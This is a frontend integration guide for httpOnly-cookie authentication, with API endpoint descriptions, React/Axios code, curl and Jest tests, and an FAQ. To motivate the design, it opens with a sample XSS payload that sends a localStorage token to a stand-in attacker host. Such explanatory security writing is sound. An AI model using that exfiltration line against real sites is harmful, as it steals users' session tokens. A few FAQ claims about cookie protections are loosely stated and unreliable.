# httpOnly Cookie Authentication - Frontend Integration Guide

## 🔐 Security Architecture

### Why httpOnly Cookies?

**Problem**: localStorage is vulnerable to XSS attacks
```javascript
// ❌ DANGEROUS - XSS can steal token
localStorage.setItem('token', response.data.token);

// Attacker's XSS payload:
fetch('https://attacker.com?token=' + localStorage.getItem('token'));
```

**Solution**: httpOnly Cookies with automatic browser handling
```javascript
// ✅ SAFE - httpOnly cookie, JavaScript cannot access
// Browser automatically sends cookie with requests
// XSS cannot steal via document.cookie or localStorage
```

### Cookie Flags Protection

| Flag | Purpose | XSS Protection | CSRF Protection | HTTPS Only |
|------|---------|---|---|---|
| `httpOnly` | ✅ JavaScript cannot access | YES | - | - |
| `Secure` | ✅ HTTPS only | - | - | YES |
| `SameSite=Strict` | ✅ No cross-site sending | YES | YES | - |

---

## 📝 API Endpoints

### 1. Login - GET httpOnly Cookie

**Endpoint**: `POST /api/auth/login-httponly`

**Request** (Frontend sends):
```javascript
POST /api/auth/login-httponly
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123",
  "remember_me": false
}
```

**Response** (Backend returns):
```json
{
  "success": true,
  "message": "Login thành công. Token đã được set trong httpOnly cookie.",
  "user": {
    "id": 1,
    "name": "John Doe",
    "email": "user@example.com"
  },
  "csrf_token": "abc123xyz...",
  "expires_in_minutes": 60,
  "expires_at": "2025-11-21T15:30:00Z",
  "token_type": "short_lived"
}
```

**⚠️ CRITICAL**: Response does NOT contain plaintext token!
- Token only in httpOnly cookie (set by browser via Set-Cookie header)
- CSRF token for X-XSRF-TOKEN header validation

**Browser Action**:
- Automatically stores `soleil_token` in httpOnly cookie
- Automatically includes in all requests to same domain

---

### 2. Refresh Token - Rotate Token

**Endpoint**: `POST /api/auth/refresh-httponly`

**Request**:
```javascript
POST /api/auth/refresh-httponly
// Browser automatically sends httpOnly cookie
```

**Response**:
```json
{
  "success": true,
  "message": "Token refreshed thành công.",
  "csrf_token": "new_csrf_token...",
  "expires_in_minutes": 60,
  "expires_at": "2025-11-21T16:30:00Z",
  "token_type": "short_lived"
}
```

**Security Flow**:
1. Old token_identifier in cookie
2. Backend creates new token_identifier + token_hash
3. Old token revoked (revoked_at = now)
4. New httpOnly cookie set (token rotation)
5. **Result**: Leaked old token becomes useless

---

### 3. Logout - Revoke Token

**Endpoint**: `POST /api/auth/logout-httponly`

**Request**:
```javascript
POST /api/auth/logout-httponly
// Browser automatically sends httpOnly cookie
```

**Response**:
```json
{
  "success": true,
  "message": "Logout thành công."
}
```

**Security Flow**:
1. Token_identifier from cookie looked up in DB
2. Token marked as revoked (revoked_at = now)
3. httpOnly cookie cleared (Set-Cookie with empty value + past expiry)

---

### 4. Me - Get Current User

**Endpoint**: `GET /api/auth/me-httponly`

**Request**:
```javascript
GET /api/auth/me-httponly
// Browser automatically sends httpOnly cookie
```

**Response**:
```json
{
  "success": true,
  "user": {
    "id": 1,
    "name": "John Doe",
    "email": "user@example.com"
  },
  "token": {
    "name": "httponly-web-cookie",
    "type": "short_lived",
    "expires_at": "2025-11-21T15:30:00Z",
    "expires_in_minutes": 45,
    "last_used_at": "2025-11-21T14:45:00Z"
  }
}
```

---

### 5. CSRF Token - Get Public Token

**Endpoint**: `GET /api/auth/csrf-token`

**Request** (Public - before login):
```javascript
GET /api/auth/csrf-token
```

**Response**:
```json
{
  "csrf_token": "abc123xyz..."
}
```

**Use Case**: Frontend fetches CSRF token on page load, stores temporarily in state

---

## 💻 Frontend Implementation

### 1. Setup Axios with Automatic Cookie + CSRF

```typescript
// src/api.ts

import axios from 'axios';

const api = axios.create({
  baseURL: 'http://localhost:8000/api',
  withCredentials: true,  // ⚡ CRITICAL: Send cookies with requests
});

// Axios interceptor: Add X-XSRF-TOKEN header for CSRF protection
api.interceptors.request.use((config) => {
  // Get CSRF token from cookie or sessionStorage (not localStorage!)
  const csrfToken = getCsrfToken();
  
  if (csrfToken && config.method !== 'get') {
    config.headers['X-XSRF-TOKEN'] = csrfToken;
  }

  return config;
});

// Axios interceptor: Handle 401 → automatic refresh
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 + not already retried
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Refresh token (httpOnly cookie auto-sent)
        const response = await api.post('/auth/refresh-httponly');

        // Update CSRF token in state
        const newCsrfToken = response.data.csrf_token;
        sessionStorage.setItem('csrf_token', newCsrfToken);

        // Retry original request
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed → logout user
        sessionStorage.clear();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default api;
```

### 2. CSRF Token Management (sessionStorage - NOT localStorage!)

```typescript
// src/utils/csrf.ts

/**
 * Get CSRF token from sessionStorage (cleared on browser close)
 * Never use localStorage for sensitive tokens!
 */
export function getCsrfToken(): string | null {
  return sessionStorage.getItem('csrf_token');
}

/**
 * Save CSRF token to sessionStorage
 * Called after login success response
 */
export function setCsrfToken(token: string): void {
  sessionStorage.setItem('csrf_token', token);
}

/**
 * Clear CSRF token on logout
 */
export function clearCsrfToken(): void {
  sessionStorage.removeItem('csrf_token');
}

/**
 * Pre-fetch CSRF token before login (optional optimization)
 */
export async function fetchCsrfToken(): Promise<string> {
  const api = await import('./api').then(m => m.default);
  const response = await api.get('/auth/csrf-token');
  const token = response.data.csrf_token;
  setCsrfToken(token);
  return token;
}
```

### 3. Login Handler - httpOnly Cookie Auth

```typescript
// src/hooks/useAuth.tsx

import { useContext, createContext, useState } from 'react';
import api from '../api';
import { setCsrfToken, clearCsrfToken } from '../utils/csrf';

interface User {
  id: number;
  name: string;
  email: string;
}

interface AuthContextType {
  user: User | null;
  loading: boolean;
  error: string | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  me: () => Promise<User | null>;
}

const AuthContext = createContext<AuthContextType | null>(null);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const login = async (email: string, password: string) => {
    setLoading(true);
    setError(null);

    try {
      // ========== LOGIN - GET httpOnly COOKIE ==========
      const response = await api.post('/auth/login-httponly', {
        email,
        password,
        remember_me: false, // false = short_lived (1 hour)
      });

      // ✅ Token automatically stored in httpOnly cookie by browser
      // ✅ No plaintext token in response body
      // ✅ Cannot access via JavaScript (XSS safe)

      // Save CSRF token to sessionStorage for header
      setCsrfToken(response.data.csrf_token);

      // Save user info
      setUser(response.data.user);
      setError(null);
    } catch (err: any) {
      setError(err.response?.data?.message || 'Login failed');
      throw err;
    } finally {
      setLoading(false);
    }
  };

  const logout = async () => {
    setLoading(true);

    try {
      // ========== LOGOUT - REVOKE TOKEN ==========
      // Browser automatically sends httpOnly cookie
      await api.post('/auth/logout-httponly');

      // Clear state
      setUser(null);
      clearCsrfToken();
      setError(null);
    } catch (err) {
      console.error('Logout error:', err);
    } finally {
      setLoading(false);
    }
  };

  const me = async (): Promise<User | null> => {
    try {
      // ========== GET ME - VALIDATE TOKEN ==========
      const response = await api.get('/auth/me-httponly');

      setUser(response.data.user);
      return response.data.user;
    } catch (err) {
      setUser(null);
      throw err;
    }
  };

  return (
    <AuthContext.Provider value={{ user, loading, error, login, logout, me }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}
```

### 4. Login Form Component

```typescript
// src/components/LoginForm.tsx

import { useState } from 'react';
import { useAuth } from '../hooks/useAuth';
import { useNavigate } from 'react-router-dom';

export function LoginForm() {
  const { login, loading, error } = useAuth();
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // ========== LOGIN - httpOnly COOKIE ==========
      await login(email, password);

      // ✅ Token stored in httpOnly cookie (browser managed)
      // ✅ Axios interceptor handles CSRF token in header
      // ✅ XSS cannot access token
      
      navigate('/dashboard');
    } catch (err) {
      // Error already set in context
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label htmlFor="email">Email</label>
        <input
          id="email"
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />
      </div>

      <div>
        <label htmlFor="password">Password</label>
        <input
          id="password"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
      </div>

      {error && <div className="error">{error}</div>}

      <button type="submit" disabled={loading}>
        {loading ? 'Logging in...' : 'Login'}
      </button>
    </form>
  );
}
```

### 5. Protected Route Component

```typescript
// src/components/ProtectedRoute.tsx

import { useEffect } from 'react';
import { useAuth } from '../hooks/useAuth';
import { Navigate } from 'react-router-dom';

export function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { user, loading } = useAuth();

  useEffect(() => {
    // Optional: Validate token on mount
    // if (!user && !loading) {
    //   const { me } = useAuth();
    //   me().catch(() => {});
    // }
  }, [user, loading]);

  if (loading) {
    return <div>Loading...</div>;
  }

  if (!user) {
    return <Navigate to="/login" />;
  }

  return <>{children}</>;
}
```

---

## ⚠️ Security Checklist

### Frontend

- [ ] NO localStorage token storage
- [ ] CSRF token in sessionStorage (cleared on close)
- [ ] Axios `withCredentials: true` (send cookies)
- [ ] X-XSRF-TOKEN header added to non-GET requests
- [ ] 401 response triggers automatic refresh
- [ ] Failed refresh → logout + redirect to login
- [ ] httpOnly cookie never accessed via JavaScript

### Backend (Already Implemented)

- [ ] httpOnly cookie set (JavaScript cannot access)
- [ ] Secure flag set (HTTPS only in production)
- [ ] SameSite=Strict (no cross-site sending)
- [ ] Token response does NOT include plaintext token
- [ ] CSRF token returned in response
- [ ] Token rotation on refresh (old token revoked)
- [ ] Revoke on logout (token + cookie)
- [ ] Device fingerprint optional (verify_device_fingerprint config)

---

## 🧪 Testing

### Manual Testing

```bash
# 1. Login
curl -X POST http://localhost:8000/api/auth/login-httponly \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "password": "password123"}' \
  -v  # Show cookie headers

# Response headers should include:
# Set-Cookie: soleil_token=<uuid>; Path=/; HttpOnly; SameSite=Strict

# 2. Refresh token (cookie auto-sent by curl with -b flag)
curl -X POST http://localhost:8000/api/auth/refresh-httponly \
  -b "soleil_token=<uuid from step 1>" \
  -v

# 3. Logout
curl -X POST http://localhost:8000/api/auth/logout-httponly \
  -b "soleil_token=<uuid>" \
  -v

# Response should include:
# Set-Cookie: soleil_token=; expires=<past date>; ...
```

### Automated Testing (Jest + React Testing Library)

```typescript
// src/__tests__/auth.integration.test.ts

import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { LoginForm } from '../components/LoginForm';
import { AuthProvider } from '../hooks/useAuth';

describe('httpOnly Cookie Authentication', () => {
  test('login sets httpOnly cookie (not localStorage)', async () => {
    const user = userEvent.setup();

    render(
      <AuthProvider>
        <LoginForm />
      </AuthProvider>
    );

    // Fill form
    await user.type(screen.getByLabelText(/email/i), 'test@example.com');
    await user.type(screen.getByLabelText(/password/i), 'password123');

    // Submit
    await user.click(screen.getByText(/login/i));

    // Wait for redirect
    await waitFor(() => {
      expect(window.location.pathname).toBe('/dashboard');
    });

    // ✅ Verify NO localStorage token
    expect(localStorage.getItem('token')).toBeNull();
    expect(localStorage.getItem('access_token')).toBeNull();

    // ✅ Verify httpOnly cookie exists (cannot access via JS in test)
    // In real browser, httpOnly cookie sent automatically
    const csrfToken = sessionStorage.getItem('csrf_token');
    expect(csrfToken).toBeTruthy();
  });

  test('logout clears sessionStorage CSRF token', async () => {
    // ... login first ...

    const user = userEvent.setup();
    await user.click(screen.getByText(/logout/i));

    // ✅ CSRF token cleared
    expect(sessionStorage.getItem('csrf_token')).toBeNull();

    // ✅ Redirect to login
    expect(window.location.pathname).toBe('/login');
  });
});
```

---

## 🔗 Related Documentation

- [Backend httpOnly Implementation](../../HTTPONLY_COOKIE_IMPLEMENTATION.md)
- [Token Expiration](../../TOKEN_EXPIRATION_IMPLEMENTATION.md)
- [Security Best Practices](../../SECURITY_IMPLEMENTATION.md)

---

## FAQ

**Q: Why not just use Bearer token in localStorage?**
A: localStorage is vulnerable to XSS attacks. JavaScript code (including malicious code injected via XSS) can access and steal tokens. httpOnly cookies are inaccessible to JavaScript.

**Q: Can httpOnly cookies be stolen?**
A: Only via:
1. Network interception (prevented by Secure flag + HTTPS)
2. Man-in-the-middle (prevented by HTTPS)
3. Cross-site request forgery (prevented by SameSite=Strict)

httpOnly prevents the most common attack: XSS JavaScript access.

**Q: Why sessionStorage for CSRF token, not localStorage?**
A: sessionStorage clears automatically when browser closes, reducing attack surface. localStorage persists indefinitely.

**Q: What if user disables cookies?**
A: httpOnly cookie auth won't work. Fall back to Bearer token in localStorage with explicit XSS mitigation (CSP, DOMPurify, etc).

**Q: Can I access httpOnly cookie from React?**
A: No, and that's the point! The browser handles it automatically. You cannot and should not try to access it.
